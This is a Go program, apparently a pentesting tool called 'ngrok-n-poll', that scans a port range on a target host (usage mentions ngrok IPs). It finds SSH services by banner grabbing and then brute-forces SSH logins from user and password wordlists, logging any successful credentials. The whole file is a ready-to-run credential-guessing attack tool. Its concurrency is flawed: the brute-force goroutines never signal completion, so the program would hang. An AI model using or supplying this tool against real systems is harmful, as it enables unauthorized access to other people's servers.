package main

import (
	"bufio"
	"fmt"
	"log"
	"net"
	"os"
	"strconv"
	"strings"
	"time"

	"golang.org/x/crypto/ssh"
)

var users []string
var passwords []string
var sshPorts []int

func greeting(version string) {
	fmt.Println("")
	fmt.Println("                                    dP                                                    dP dP ")
	fmt.Println("                                    88                                                    88 88 ")
	fmt.Println("88d888b. .d8888b. 88d888b. .d8888b. 88  .dP           88d888b.          88d888b. .d8888b. 88 88 ")
	fmt.Println("88'  `88 88'  `88 88'  `88 88'  `88 88888    88888888 88'  `88 88888888 88'  `88 88'  `88 88 88 ")
	fmt.Println("88    88 88.  .88 88       88.  .88 88   8b.          88    88          88       88.  .88 88 88 ")
	fmt.Println("dP    dP `8888P88 dP       `88888P' dP   `YP          dP    dP          dP       `88888P' dP dP ")
	fmt.Println("              .88                                                                               ")
	fmt.Println("          d8888P                                                                                ")
	fmt.Println("")
	fmt.Println("################################################################################################")
	fmt.Println("")
	fmt.Println("Inspired by @id2746")
	fmt.Println("Developed by @PiterPentester")
	fmt.Println("")
	fmt.Println("Version:", version)
	fmt.Println("")
}

func printUsage() {
	fmt.Println(os.Args[0] + ` - search for a SSH ports on ngrok IP and bruteforce passwords.

Passwords should be separated by newlines.
URL should include hostname or ip and ports range!

Usage:
  ` + os.Args[0] + ` <usernames> <pwlistfile> <url> <ports-range>

Example:
  ` + os.Args[0] + ` users.txt pass.txt example.com 0-1024
`)
}

func checkArgs() (string, string, string, string) {
	if len(os.Args) != 5 {
		log.Println("Incorrect number of arguments.")
		printUsage()
		os.Exit(1)
	}

	// UsersList, Password list filename, URL, portsRange
	return os.Args[1], os.Args[2], os.Args[3], os.Args[4]
}

func getPortsRange(r string) (int, int) {
	res := strings.Split(r, "-")
	min, _ := strconv.Atoi(res[0])
	max, _ := strconv.Atoi(res[1])
	return min, max
}

func scan(minPort, maxPort int, ipToScan, protocol string) {
	activeThreads := 0
	doneChannel := make(chan bool)

	for port := minPort; port <= maxPort; port++ {
		go testTCPConnection(ipToScan, port, protocol, doneChannel)
		activeThreads++
	}

	// Wait for all threads to finish
	for activeThreads > 0 {
		<-doneChannel
		activeThreads--
	}
}

func testTCPConnection(ip string, port int, protocol string, doneChannel chan bool) {
	_, err := net.DialTimeout(protocol, ip+":"+strconv.Itoa(port), time.Second*10)
	if err == nil {
		log.Printf("Port %d: Open\n", port)

		grabBanner(ip, port, protocol)
	}
	doneChannel <- true
}

func grabBanner(ip string, port int, protocol string) {
	connection, cErr := net.DialTimeout(
		protocol,
		ip+":"+strconv.Itoa(port),
		time.Second*10,
	)
	if cErr != nil {
		return
	}

	// See if server offers anything to read
	buffer := make([]byte, 4096)
	connection.SetReadDeadline(time.Now().Add(time.Second * 5)) // Set timeout
	numBytesRead, rErr := connection.Read(buffer)
	if rErr != nil {
		return
	}
	log.Printf("Banner from port %d\n%s\n", port, buffer[0:numBytesRead])

	str := string(buffer[0:numBytesRead])
	if strings.Contains(str, "SSH") {
		sshPorts = append(sshPorts, port)
	}
}

func readUsers(filename string) []string {
	file, err := os.Open(filename)
	if err != nil {
		log.Fatalf("failed opening file: %s", err)
	}
	defer file.Close()

	scanner := bufio.NewScanner(file)
	scanner.Split(bufio.ScanLines)
	var txtlines []string

	for scanner.Scan() {
		txtlines = append(txtlines, scanner.Text())
	}

	return txtlines
}

func readPasswords(filename string) []string {
	file, err := os.Open(filename)
	if err != nil {
		log.Fatalf("failed opening file: %s", err)
	}
	defer file.Close()

	scanner := bufio.NewScanner(file)
	scanner.Split(bufio.ScanLines)
	var txtlines []string

	for scanner.Scan() {
		txtlines = append(txtlines, scanner.Text())
	}

	return txtlines
}

func sshBrute(users, passwords []string, ip string, port int, protocol string) {
	host := ip + ":" + strconv.Itoa(port)

	for _, pass := range passwords {
		for _, user := range users {
			config := &ssh.ClientConfig{
				User: user,
				Auth: []ssh.AuthMethod{
					ssh.Password(pass),
				},
				HostKeyCallback: ssh.InsecureIgnoreHostKey(),
			}
			client, err := ssh.Dial(protocol, host, config)
			if err != nil {
				log.Println("[-] Error dialing server. ", "user: ", user, "password: ", pass, err)
				continue
			}

			log.Println("[+] Login successful", host, "user: ", user, "password: ", pass, string(client.ClientVersion()))
		}
	}
}

func main() {
	version := "0.2alpha"
	greeting(version)

	userList, passwordList, ipToScan, portsRange := checkArgs()

	users = readUsers(userList)
	passwords = readPasswords(passwordList)

	minPort, maxPort := getPortsRange(portsRange)
	protocol := "tcp"

	scan(minPort, maxPort, ipToScan, protocol)

	activeThreads := 0
	doneChannel := make(chan bool)

	for _, p := range sshPorts {
		go sshBrute(users, passwords, ipToScan, p, protocol)
		activeThreads++
	}

	// Wait for all threads to finish
	for activeThreads > 0 {
		<-doneChannel
		activeThreads--
	}

}
